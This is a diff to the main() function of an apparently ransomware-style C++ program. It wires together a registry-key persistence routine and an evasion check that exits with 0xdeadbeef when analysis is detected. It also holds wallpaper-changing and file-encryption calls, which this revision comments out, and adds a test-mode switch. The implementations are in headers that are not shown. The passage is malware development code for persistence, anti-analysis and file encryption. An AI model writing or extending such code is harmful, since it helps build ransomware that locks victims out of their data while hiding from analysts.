@@ -4,24 +4,45 @@
 #include "Utils.h"
 #include "Crypt.h"
 #include <iostream>
-#include "Evasion.h"
 #include "Persistence.h"
+#include "Evasion.h"
 
-int main(void)
-{
+#define TEST_MODE 1
+
+#if TEST_MODE == 1
+#include "tests/test.cpp"
+#endif
+
+int main(void) {
+    #if TEST_MODE == 1 
+        Evasion evasion;
+        if (evasion.mustBeAvoided) {
+            return 0xdeadbeef;
+        }
+
+        start_testing();
+        exit(0);
+    #endif
+
+    /*
+    Evasion evasion;
+    if (evasion.mustBeAvoided == 1) {
+        return 0xdeadbeef;
+    }
+    */
+
     Persistence persistence;
     persistence.registryKeyCreation();  
     
-    Evasion evasion;
-    if (evasion.isBeingDebugging()) {
-        return 0xdeadbeef;
-    }
-
+    /*
     Utils utils;
     utils.changeWallpaper();
+    */
 
+    /*
     Crypt crypt;
     crypt.startCrypt();
 
+    */
     return EXIT_SUCCESS;
 }
